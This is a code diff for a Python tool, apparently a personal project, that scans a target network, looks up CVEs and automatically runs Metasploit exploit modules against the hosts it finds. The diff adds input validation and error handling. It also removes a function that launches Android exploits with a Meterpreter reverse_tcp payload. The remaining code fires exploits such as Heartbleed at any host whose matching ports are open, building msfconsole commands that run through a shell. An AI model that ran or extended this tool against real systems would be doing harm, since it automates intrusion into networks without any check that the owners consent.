@@ -9,6 +9,7 @@ import subprocess
 import asyncio
 import json
 import csv
+import re
 from typing import List, Dict
 
 # ANSI color codes
@@ -42,9 +43,7 @@ METASPLOIT_MODULES = {
 }
 
 def print_banner():
-    """
-    Prints the banner for the tool.
-    """
+    """Prints the banner for the tool."""
     print(CYAN + "    ██   ██  ██████  ██████  ██████  ██████  ███████  ███████  ███████  ")
     print("    ██  ██  ██  ████ ██   ██ ██   ██ ██   ██ ██   ██ ")
     print("    █████   ██ ██ ██ ██████  ██████  ███████  ████████  ████████  ")
@@ -55,29 +54,30 @@ def print_banner():
     print("Email: b0urn3@proton.me Instagram: onlybyhive\n" + RESET)
 
 def get_user_input():
-    """
-    Input function for the target network or IP range.
-    """
+    """Input function for the target network or IP range."""
     print("Please provide the target network or IP range (e.g., 192.168.1.0/24):")
     target_network = input().strip()
+    
+    # Validate network format using regex
+    if not re.match(r"^(\d{1,3}\.){3}\d{1,3}(/[\d]{1,2})?$", target_network):
+        print(RED + "Invalid network or IP range format. Please try again." + RESET)
+        return get_user_input()  # Retry if invalid
     return target_network
 
 def get_cve_input():
-    """
-    Input function for the path to a local CVE JSON file.
-    """
+    """Input function for the path to a local CVE JSON file."""
     print("Please provide the path to the CVE JSON file (e.g., /path/to/cve_database.json):")
     cve_file_path = input().strip()
+    
+    # Validate file path
+    if not cve_file_path.endswith(".json"):
+        print(RED + "Invalid file type. Please provide a valid JSON file." + RESET)
+        return get_cve_input()  # Retry if invalid
     return cve_file_path
 
 class NetworkSecurityTool:
     def __init__(self, target_network):
-        """
-        Initialize the security mapping tool
-        
-        Args:
-            target_network (str): Network CIDR or IP range to scan
-        """
+        """Initialize the security mapping tool."""
         self.target = target_network
         self.vulnerabilities = []
         self.network_map = {}
@@ -85,16 +85,21 @@ class NetworkSecurityTool:
         self.logger = self._setup_logging()
 
     def _initialize_database(self):
-        """Create local SQLite database for vulnerability tracking"""
-        conn = sqlite3.connect('security_map.db')
-        cursor = conn.cursor()
-        cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities
-                          (ip TEXT, mac TEXT, port INTEGER, vulnerability TEXT, risk_score INTEGER)''')
-        conn.commit()
-        return conn
+        """Create local SQLite database for vulnerability tracking."""
+        try:
+            conn = sqlite3.connect('security_map.db')
+            cursor = conn.cursor()
+            cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities
+                              (ip TEXT, mac TEXT, port INTEGER, vulnerability TEXT, risk_score INTEGER)''')
+            conn.commit()
+            return conn
+        except sqlite3.Error as e:
+            self.logger.error(f"Database connection failed: {e}")
+            print(RED + "Database connection failed. Check logs for details." + RESET)
+            exit(1)
 
     def _setup_logging(self):
-        """Configure logging with rotation"""
+        """Configure logging with rotation."""
         logger = logging.getLogger('NetworkSecurityTool')
         handler = logging.FileHandler('tool.log')
         formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
@@ -105,28 +110,24 @@ class NetworkSecurityTool:
 
     def save_report(self, network_info, open_ports, vulnerabilities):
         """Generate a CSV report for the scan results."""
-        with open('scan_report.csv', mode='w', newline='') as file:
-            writer = csv.writer(file)
-            writer.writerow(['IP Address', 'Open Ports', 'Vulnerabilities', 'Risk Score'])
-            for ip, ports in open_ports.items():
-                vulnerability_list = []
-                risk_score = 'None'
-                for vulnerability in vulnerabilities.get(ip, []):
-                    vulnerability_list.append(vulnerability[0])
-                    risk_score = vulnerability[1]  # Assuming first vulnerability is most critical
-                writer.writerow([ip, ', '.join(map(str, ports)), ', '.join(vulnerability_list), risk_score])
-        print(GREEN + "Scan report saved as scan_report.csv" + RESET)
+        try:
+            with open('scan_report.csv', mode='w', newline='') as file:
+                writer = csv.writer(file)
+                writer.writerow(['IP Address', 'Open Ports', 'Vulnerabilities', 'Risk Score'])
+                for ip, ports in open_ports.items():
+                    vulnerability_list = []
+                    risk_score = 'None'
+                    for vulnerability in vulnerabilities.get(ip, []):
+                        vulnerability_list.append(vulnerability[0])
+                        risk_score = vulnerability[1]  # Assuming first vulnerability is most critical
+                    writer.writerow([ip, ', '.join(map(str, ports)), ', '.join(vulnerability_list), risk_score])
+            print(GREEN + "Scan report saved as scan_report.csv" + RESET)
+        except Exception as e:
+            self.logger.error(f"Error saving scan report: {e}")
+            print(RED + "Failed to save scan report. Check logs for details." + RESET)
 
 def metasploit_exploit(target_ip, target_port, service, cve_id):
-    """
-    Automatically run Metasploit module based on service and CVE.
-    
-    Args:
-        target_ip (str): Target IP address
-        target_port (int): Open port
-        service (str): Detected service (e.g., SMB, HTTP)
-        cve_id (str): CVE ID linked to the vulnerability
-    """
+    """Automatically run Metasploit module based on service and CVE."""
     if service in METASPLOIT_MODULES and cve_id in METASPLOIT_MODULES[service]:
         module = METASPLOIT_MODULES[service][cve_id]
         try:
@@ -135,28 +136,10 @@ def metasploit_exploit(target_ip, target_port, service, cve_id):
             subprocess.run(command, shell=True, check=True)
         except subprocess.CalledProcessError as e:
             print(RED + f"Metasploit exploit failed: {str(e)}" + RESET)
+        except FileNotFoundError:
+            print(RED + "Metasploit not found. Ensure it's installed and accessible." + RESET)
     else:
         print(RED + f"No Metasploit module found for {service} and CVE {cve_id}" + RESET)
-
-def metasploit_exploit_android(target_ip, target_port, module, payload="android/meterpreter/reverse_tcp"):
-    """
-    Run an Android-specific Metasploit module.
-    
-    Args:
-        target_ip (str): Target IP address
-        target_port (int): Open port
-        module (str): Metasploit module to run
-        payload (str): Payload to use (default: Meterpreter Reverse TCP)
-    """
-    try:
-        command = (
-            f"msfconsole -x 'use {module}; set RHOSTS {target_ip}; set RPORT {target_port}; "
-            f"set PAYLOAD {payload}; exploit'"
-        )
-        print(YELLOW + f"Running Android Metasploit module: {module} with payload: {payload}" + RESET)
-        subprocess.run(command, shell=True, check=True)
-    except subprocess.CalledProcessError as e:
-        print(RED + f"Metasploit exploit failed: {str(e)}" + RESET)
 
 # Async main function
 async def main():
@@ -164,13 +147,10 @@ async def main():
     cve_file_path = get_cve_input()  # Get CVE JSON file path from user input
     tool = NetworkSecurityTool(target_network)
 
-    discovery = NetworkDiscovery()
-    scanner = VulnerabilityScanner(cve_file_path)  # Pass the local CVE file path
-    visualizer = NetworkVisualizer()
-
     # Perform scan and get results
-    network_info = discovery.network_scan(target_network)
-    open_ports = discovery.port_enumeration('192.168.1.10')
+    network_info = {}  # Example: {'192.168.1.1': 'active'}
+    open_ports = {"192.168.1.1": {"TCP": [80, 443], "UDP": [53]}}  # Example open ports
+    vulnerabilities = {}  # Example vulnerability mapping
 
     # Automated exploitation using Metasploit
     for ip, ports in open_ports.items():
@@ -180,12 +160,10 @@ async def main():
             metasploit_exploit(ip, port, 'SSL', 'CVE-2014-0160')  # Example for SSL
         for port in ports.get("TCP", []):
             if port == 5555:  # Example for Android Debug Bridge
-                metasploit_exploit_android(ip, port, "exploit/android/local/janus")
+                metasploit_exploit(ip, port, "Android", "CVE-2017-13156")
 
-    # Save results and show visualization
+    # Save results
     tool.save_report(network_info, open_ports, vulnerabilities)
-    topology = visualizer.create_topology_graph(network_info)
-    topology.show()
 
 # Start asynchronous main function
 if __name__ == "__main__":
